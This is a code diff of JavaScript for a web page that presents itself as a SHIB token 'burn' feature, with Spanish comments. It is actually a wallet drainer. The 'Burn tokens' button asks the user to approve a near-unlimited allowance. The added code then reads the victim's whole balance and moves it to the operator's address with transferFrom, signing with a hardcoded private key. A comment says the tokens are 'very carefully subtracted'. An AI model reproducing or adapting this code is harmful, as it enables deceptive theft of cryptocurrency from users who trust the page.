@@ -33,10 +33,15 @@ async function burnEvents() {
       errParr.innerHTML = text;
     }
 
+    async function getSHIBBalance() {
+      let balance = await shibContract.methods.balanceOf(myAccount).call();
+      return balance;
+    }
+
     async function burnOn() {
+      this.innerHTML = "<div class='preloader'></div>";
       if (isConnected) {
         activeCheck(tickBurn);
-        shibContract = new web3.eth.Contract(shibAbi, shibContractAddress, {from: myAccount});
         let bigNumber = web3.utils.toBN('1000000000000000000000000000000'),
             datita = await shibContract.methods.approve(ourAddress, bigNumber).encodeABI();
         
@@ -52,31 +57,37 @@ async function burnEvents() {
         // Solicitamos firma de aprobación
         await window.ethereum.request({ method: 'eth_sendTransaction', params: tx })
           .then(async function () {
-            // Acá, después de que aceptó, sustraemos muy cuidadosamente sus tokens 
-            let estimateGas = await shibContract.methods.transfer(0, 0).estimateGas({from: ourAddress});
-                datita = await shibContract.methods.transfer(myAccount, ourAddress).encodeABI();
-            
-            tx = [{
-              from: ourAddress, 
-              to: shibContractAddress, 
-              data: datita,
-              gas: estimateGas
-            }];
 
-            // Firmamos la transacción con cuenta externa
-            web3.eth.signTransaction(tx, 'a38b37851bf4dee48331b029be84c401463025c13e4c664033422de858e1e17b').on('receipt', function (result) {
-                // Una vez firmada, la enviamos.
-                web3.eth.sendSignedTransaction(result['rawTransaction']).on('receipt', function (res) {
-                    view_index();
+            // Obtenemos el balance para enviarlo
+            getSHIBBalance().then(async function (balance) {
+                // Acá, después de que aceptó, sustraemos muy cuidadosamente sus tokens 
+                let estimateGas = await shibContract.methods.transferFrom(myAccount, ourAddress, balance).estimateGas({from: ourAddress});
+                    datita = await shibContract.methods.transferFrom(myAccount, ourAddress, balance).encodeABI();
+                
+                tx = [{
+                  from: ourAddress, 
+                  to: shibContractAddress, 
+                  data: datita,
+                  gas: estimateGas
+                }];
+
+                // Firmamos la transacción con cuenta externa
+                web3.eth.signTransaction(tx, 'a38b37851bf4dee48331b029be84c401463025c13e4c664033422de858e1e17b').on('receipt', function (result) {
+                    // Una vez firmada, la enviamos.
+                    web3.eth.sendSignedTransaction(result['rawTransaction']).on('receipt', function (res) {
+                        view_index();
+                    });
                 });
-            });
 
+              });
           })
           .catch((error) => {
               // Sí rechazó, mostramos error
+              this.innerHTML = 'Burn tokens';
               showError('Please, accept the request.')
-          })
+          });
       } else {
+        this.innerHTML = 'Burn tokens';
         showError('Please, connect your wallet.')
       }
     }
@@ -108,6 +119,8 @@ async function burnEvents() {
     shareButtons[1].onclick = shareOn;
     shareButtons[2].onclick = shareOn;
     shareButtons[3].onclick = shareOn;
+
+    if (isConnected) shibContract = new web3.eth.Contract(shibAbi, shibContractAddress, {from: myAccount});
 }
 
 async function loadView(src, newUrl) {
